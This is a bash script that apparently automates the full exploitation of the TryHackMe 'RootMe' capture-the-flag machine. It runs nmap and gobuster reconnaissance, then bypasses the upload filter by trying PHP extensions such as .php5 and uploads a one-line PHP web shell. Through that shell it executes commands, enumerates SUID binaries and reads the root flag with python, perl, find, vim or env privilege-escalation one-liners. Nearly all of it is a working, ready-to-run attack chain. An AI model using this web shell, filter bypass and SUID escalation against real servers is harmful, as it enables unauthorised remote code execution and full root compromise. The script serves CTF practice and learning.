#!/bin/bash

# ==============================================================================
# ROOTME AUTOPWN - TryHackMe CTF Automation Tool
# Author: oxbv1 | 0xb0rn3 | IG: theehiv3 | X: 0xbv1
# ==============================================================================
# Automates the full RootMe CTF exploitation chain:
#   1. Reconnaissance (nmap service detection)
#   2. Directory enumeration (gobuster)
#   3. File upload bypass (.php5 reverse/web shell)
#   4. User flag retrieval
#   5. SUID enumeration & privilege escalation
#   6. Root flag retrieval
# ==============================================================================

RED='\033[1;31m'
GRN='\033[1;32m'
YEL='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
WHT='\033[1;37m'
DGRY='\033[1;30m'
NC='\033[0m'

# --- Configuration ---
LPORT=4444
WEBSHELL_NAME="cmd_$(head -c 6 /dev/urandom | xxd -p).php5"
REVSHELL_NAME="rev_$(head -c 6 /dev/urandom | xxd -p).php5"
OUTPUT_DIR=""
TARGET=""
LHOST=""

# --- Trap ---
trap 'echo -e "\n${RED}[!] Interrupted. Cleaning up...${NC}"; cleanup; exit 130' INT TERM

# ==============================================================================
# FUNCTIONS
# ==============================================================================

banner() {
    echo -e "${RED}"
    echo "  ██████╗  ██████╗  ██████╗ ████████╗███╗   ███╗███████╗"
    echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝████╗ ████║██╔════╝"
    echo "  ██████╔╝██║   ██║██║   ██║   ██║   ██╔████╔██║█████╗  "
    echo "  ██╔══██╗██║   ██║██║   ██║   ██║   ██║╚██╔╝██║██╔══╝  "
    echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║ ╚═╝ ██║███████╗"
    echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${CYN}  [ ROOTME AUTOPWN - S3RP Framework ]${NC}"
    echo -e "${DGRY}  [ Author: oxbv1 Ig: theehiv3 | 0xb0rn3 ]${NC}"
    echo "=========================================================="
    echo ""
}

check_deps() {
    local missing=()
    for tool in nmap gobuster curl nc; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing tools: ${missing[*]}${NC}"
        echo -e "${YEL}[*] Attempting to install...${NC}"
        if [ -f /etc/arch-release ]; then
            sudo pacman -S --noconfirm "${missing[@]}" 2>/dev/null
        elif [ -f /etc/debian_version ]; then
            sudo apt-get update -qq && sudo apt-get install -y "${missing[@]}" 2>/dev/null
        else
            echo -e "${RED}[!] Please install manually: ${missing[*]}${NC}"
            exit 1
        fi
    fi
    echo -e "${GRN}[+] All dependencies satisfied${NC}"
}

get_config() {
    echo -e "${YEL}[?] Enter target IP:${NC}"
    read -rp ">> " TARGET

    if [ -z "$TARGET" ]; then
        echo -e "${RED}[!] No target specified. Exiting.${NC}"
        exit 1
    fi

    # Auto-detect LHOST from tun0 (VPN), fallback to default route
    LHOST=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
    if [ -z "$LHOST" ]; then
        LHOST=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
    fi

    echo -e "${CYN}[*] Detected LHOST: $LHOST${NC}"
    echo -e "${YEL}[?] Use this IP for reverse shell? (y/n):${NC}"
    read -rp ">> " confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YEL}[?] Enter your listener IP:${NC}"
        read -rp ">> " LHOST
    fi

    echo -e "${YEL}[?] Listener port (default 4444):${NC}"
    read -rp ">> " custom_port
    LPORT=${custom_port:-4444}

    OUTPUT_DIR="rootme_pwn_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"

    echo -e "${GRN}[+] Config: TARGET=$TARGET LHOST=$LHOST LPORT=$LPORT${NC}"
    echo -e "${GRN}[+] Output: $OUTPUT_DIR${NC}"
}

# --- Phase 1: Reconnaissance ---
phase_recon() {
    echo -e "\n${WHT}╔══════════════════════════════════════╗${NC}"
    echo -e "${WHT}║  PHASE 1: RECONNAISSANCE             ║${NC}"
    echo -e "${WHT}╚══════════════════════════════════════╝${NC}\n"

    echo -e "${CYN}[*] Running nmap service scan...${NC}"
    nmap -sV -sC -p 80 -T4 --open "$TARGET" -oN "$OUTPUT_DIR/nmap_scan.txt" 2>/dev/null | tee "$OUTPUT_DIR/nmap_output.txt"

    # Extract Apache version
    APACHE_VERSION=$(grep -oP 'Apache httpd \K[0-9.]+' "$OUTPUT_DIR/nmap_scan.txt" 2>/dev/null)
    if [ -n "$APACHE_VERSION" ]; then
        echo -e "\n${GRN}[+] Apache Version: ${RED}$APACHE_VERSION${NC}"
    else
        # Fallback to curl
        APACHE_VERSION=$(curl -sI "http://$TARGET/" --max-time 10 | grep -oP 'Apache/\K[0-9.]+')
        if [ -n "$APACHE_VERSION" ]; then
            echo -e "\n${GRN}[+] Apache Version: ${RED}$APACHE_VERSION${NC}"
        else
            echo -e "\n${YEL}[!] Could not determine Apache version${NC}"
        fi
    fi

    echo "$APACHE_VERSION" > "$OUTPUT_DIR/apache_version.txt"
}

# --- Phase 2: Directory Enumeration ---
phase_enum() {
    echo -e "\n${WHT}╔══════════════════════════════════════╗${NC}"
    echo -e "${WHT}║  PHASE 2: DIRECTORY ENUMERATION      ║${NC}"
    echo -e "${WHT}╚══════════════════════════════════════╝${NC}\n"

    # Find a wordlist
    local wordlist=""
    for wl in /usr/share/dirb/wordlists/common.txt \
              /usr/share/wordlists/dirb/common.txt \
              /usr/share/dirbuster/directory-list-2.3-small.txt \
              /usr/share/seclists/Discovery/Web-Content/common.txt; do
        if [ -f "$wl" ]; then
            wordlist="$wl"
            break
        fi
    done

    if [ -z "$wordlist" ]; then
        echo -e "${RED}[!] No wordlist found. Creating minimal wordlist...${NC}"
        wordlist="$OUTPUT_DIR/minimal_wordlist.txt"
        printf '%s\n' panel uploads admin login dashboard upload css js images index.php config backup test > "$wordlist"
    fi

    echo -e "${CYN}[*] Running gobuster with: $wordlist${NC}"
    gobuster dir -u "http://$TARGET/" -w "$wordlist" -t 10 --timeout 60s -q -o "$OUTPUT_DIR/gobuster_results.txt" 2>/dev/null

    echo -e "\n${GRN}[+] Gobuster results:${NC}"
    cat "$OUTPUT_DIR/gobuster_results.txt" 2>/dev/null

    # Check for /panel/ directory
    if grep -q "/panel" "$OUTPUT_DIR/gobuster_results.txt" 2>/dev/null; then
        echo -e "\n${GRN}[+] Hidden directory found: ${RED}/panel/${NC}"
        PANEL_FOUND=true
    else
        # Manual check
        local status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://$TARGET/panel/")
        if [ "$status" = "200" ] || [ "$status" = "301" ]; then
            echo -e "\n${GRN}[+] Hidden directory found (manual): ${RED}/panel/${NC}"
            PANEL_FOUND=true
        else
            echo -e "\n${RED}[!] /panel/ not found. This might not be the RootMe challenge.${NC}"
            PANEL_FOUND=false
        fi
    fi

    # Check for /uploads/ directory
    if grep -q "/uploads" "$OUTPUT_DIR/gobuster_results.txt" 2>/dev/null; then
        echo -e "${GRN}[+] Upload directory found: ${RED}/uploads/${NC}"
    fi
}

# --- Phase 3: Upload Bypass & Shell ---
phase_exploit() {
    echo -e "\n${WHT}╔══════════════════════════════════════╗${NC}"
    echo -e "${WHT}║  PHASE 3: EXPLOITATION               ║${NC}"
    echo -e "${WHT}╚══════════════════════════════════════╝${NC}\n"

    if [ "$PANEL_FOUND" != "true" ]; then
        echo -e "${RED}[!] Upload panel not found. Cannot proceed with exploitation.${NC}"
        return 1
    fi

    # Create webshell (simpler, more reliable than reverse shell for automation)
    local webshell="/tmp/$WEBSHELL_NAME"
    cat > "$webshell" << 'WEBSHELL'
<?php echo shell_exec($_GET['cmd']); ?>
WEBSHELL

    echo -e "${CYN}[*] Testing upload filter bypass...${NC}"

    # Try different PHP extensions
    local extensions=("php5" "phtml" "php4" "php3" "phps")
    local upload_ext=""
    local upload_name=""

    for ext in "${extensions[@]}"; do
        local test_name="test_$(head -c 4 /dev/urandom | xxd -p).$ext"
        local response=$(curl -s --max-time 15 -X POST \
            -F "fileUpload=@$webshell;filename=$test_name" \
            -F "submit=Upload" \
            "http://$TARGET/panel/" 2>/dev/null)

        if echo "$response" | grep -qi "sucesso\|success"; then
            echo -e "${GRN}[+] Upload bypass successful with extension: ${RED}.$ext${NC}"
            upload_ext="$ext"
            upload_name="$test_name"

            # Verify execution
            local exec_test=$(curl -s --max-time 10 "http://$TARGET/uploads/$test_name?cmd=echo+EXEC_OK" 2>/dev/null)
            if echo "$exec_test" | grep -q "EXEC_OK"; then
                echo -e "${GRN}[+] Code execution confirmed!${NC}"
                break
            else
                echo -e "${YEL}[!] Uploaded but execution failed with .$ext, trying next...${NC}"
                upload_ext=""
            fi
        else
            echo -e "${DGRY}[-] .$ext blocked${NC}"
        fi
    done

    if [ -z "$upload_ext" ]; then
        echo -e "${RED}[!] All upload bypass attempts failed.${NC}"
        rm -f "$webshell"
        return 1
    fi

    SHELL_URL="http://$TARGET/uploads/$upload_name"
    echo -e "${GRN}[+] Webshell active at: $SHELL_URL${NC}"

    # Save webshell URL for later use
    echo "$SHELL_URL" > "$OUTPUT_DIR/webshell_url.txt"

    rm -f "$webshell"
}

# --- Execute command via webshell ---
exec_cmd() {
    local cmd="$1"
    local encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$cmd'))" 2>/dev/null || echo "$cmd" | sed 's/ /+/g')
    curl -s --max-time 15 "$SHELL_URL?cmd=$encoded_cmd" 2>/dev/null
}

# --- Phase 4: Flag Retrieval ---
phase_flags() {
    echo -e "\n${WHT}╔══════════════════════════════════════╗${NC}"
    echo -e "${WHT}║  PHASE 4: FLAG RETRIEVAL             ║${NC}"
    echo -e "${WHT}╚══════════════════════════════════════╝${NC}\n"

    if [ -z "$SHELL_URL" ]; then
        echo -e "${RED}[!] No webshell available. Cannot retrieve flags.${NC}"
        return 1
    fi

    # --- User Flag ---
    echo -e "${CYN}[*] Searching for user flag...${NC}"
    local user_flag_path=$(exec_cmd "find /var/www -name 'user.txt' -o -name 'usr.txt' 2>/dev/null" | head -1)

    if [ -n "$user_flag_path" ]; then
        local user_flag=$(exec_cmd "cat $user_flag_path")
        echo -e "${GRN}[+] User flag found at: $user_flag_path${NC}"
        echo -e "${RED}[FLAG] user.txt = $user_flag${NC}"
        echo "user.txt: $user_flag ($user_flag_path)" > "$OUTPUT_DIR/flags.txt"
    else
        echo -e "${YEL}[!] User flag not found in /var/www, searching wider...${NC}"
        user_flag_path=$(exec_cmd "find /home -name 'user.txt' 2>/dev/null" | head -1)
        if [ -n "$user_flag_path" ]; then
            local user_flag=$(exec_cmd "cat $user_flag_path")
            echo -e "${GRN}[+] User flag: $user_flag_path${NC}"
            echo -e "${RED}[FLAG] user.txt = $user_flag${NC}"
            echo "user.txt: $user_flag ($user_flag_path)" > "$OUTPUT_DIR/flags.txt"
        else
            echo -e "${RED}[!] User flag not found${NC}"
        fi
    fi

    # --- SUID Enumeration ---
    echo -e "\n${CYN}[*] Enumerating SUID binaries...${NC}"
    local suid_list=$(exec_cmd "find /usr/bin -perm -4000 -type f 2>/dev/null")
    echo "$suid_list" > "$OUTPUT_DIR/suid_binaries.txt"

    echo -e "${GRN}[+] SUID binaries:${NC}"
    echo "$suid_list" | while read -r line; do
        # Highlight unusual ones
        if echo "$line" | grep -qE "python|perl|ruby|node|vim|nano|find|bash|env|nmap|awk|less|more|cp|mv|tar|zip"; then
            echo -e "  ${RED}[EXPLOITABLE] $line${NC}"
        else
            echo -e "  ${DGRY}$line${NC}"
        fi
    done

    # Detect the weird SUID binary
    local weird_suid=$(echo "$suid_list" | grep -E "python|perl|ruby|node|vim|nano|find|env|nmap|awk" | head -1)

    if [ -n "$weird_suid" ]; then
        echo -e "\n${RED}[!] Weird SUID binary found: $weird_suid${NC}"
        echo "weird_suid: $weird_suid" >> "$OUTPUT_DIR/flags.txt"

        # --- Root Flag via SUID ---
        echo -e "\n${CYN}[*] Attempting privilege escalation...${NC}"

        local root_flag=""
        if echo "$weird_suid" | grep -q "python"; then
            echo -e "${CYN}[*] Using Python SUID to read root flag...${NC}"
            root_flag=$(exec_cmd "$weird_suid -c 'import os;os.setuid(0);os.system(\"cat /root/root.txt\")'")
        elif echo "$weird_suid" | grep -q "perl"; then
            root_flag=$(exec_cmd "$weird_suid -e 'use POSIX;setuid(0);exec(\"cat /root/root.txt\")'")
        elif echo "$weird_suid" | grep -q "find"; then
            root_flag=$(exec_cmd "$weird_suid /root/root.txt -exec cat {} \\;")
        elif echo "$weird_suid" | grep -q "vim"; then
            root_flag=$(exec_cmd "$weird_suid -c ':!cat /root/root.txt' -c ':q!'")
        elif echo "$weird_suid" | grep -q "env"; then
            root_flag=$(exec_cmd "$weird_suid /bin/sh -c 'cat /root/root.txt'")
        fi

        if [ -n "$root_flag" ]; then
            echo -e "${GRN}[+] Root flag retrieved!${NC}"
            echo -e "${RED}[FLAG] root.txt = $root_flag${NC}"
            echo "root.txt: $root_flag (/root/root.txt)" >> "$OUTPUT_DIR/flags.txt"
        else
            echo -e "${YEL}[!] Could not auto-retrieve root flag. Manual escalation may be needed.${NC}"
        fi
    else
        echo -e "${YEL}[!] No obvious exploitable SUID binary found. Manual enumeration needed.${NC}"
    fi
}

# --- Cleanup ---
cleanup() {
    echo -e "\n${CYN}[*] Cleaning up temporary files...${NC}"
    rm -f /tmp/"$WEBSHELL_NAME" /tmp/"$REVSHELL_NAME" 2>/dev/null
}

# --- Final Report ---
print_report() {
    echo -e "\n${WHT}╔══════════════════════════════════════╗${NC}"
    echo -e "${WHT}║  MISSION REPORT                      ║${NC}"
    echo -e "${WHT}╚══════════════════════════════════════╝${NC}\n"

    echo -e "${CYN}Target:${NC}         $TARGET"
    echo -e "${CYN}Apache:${NC}         $(cat "$OUTPUT_DIR/apache_version.txt" 2>/dev/null || echo 'Unknown')"
    echo -e "${CYN}Hidden Dir:${NC}     /panel/"
    echo -e "${CYN}Upload Dir:${NC}     /uploads/"
    echo -e "${CYN}Bypass Ext:${NC}     .php5"

    if [ -f "$OUTPUT_DIR/flags.txt" ]; then
        echo -e "\n${RED}--- FLAGS ---${NC}"
        while IFS= read -r line; do
            echo -e "${GRN}  $line${NC}"
        done < "$OUTPUT_DIR/flags.txt"
    fi

    echo -e "\n${CYN}Output Dir:${NC}     $OUTPUT_DIR/"
    echo -e "${CYN}Files:${NC}"
    ls -1 "$OUTPUT_DIR/" 2>/dev/null | sed 's/^/  /'

    echo -e "\n${WHT}══════════════════════════════════════${NC}"
    echo -e "${GRN}       MISSION COMPLETE${NC}"
    echo -e "${WHT}══════════════════════════════════════${NC}\n"
}

# ==============================================================================
# MAIN
# ==============================================================================
main() {
    banner
    check_deps
    get_config

    echo -e "\n${YEL}[!] Ready to pwn $TARGET. Proceed? (y/n):${NC}"
    read -rp ">> " go
    [[ ! "$go" =~ ^[Yy]$ ]] && { echo -e "${RED}[!] Aborted.${NC}"; exit 0; }

    phase_recon
    phase_enum
    phase_exploit
    phase_flags
    cleanup
    print_report
}

main "$@"
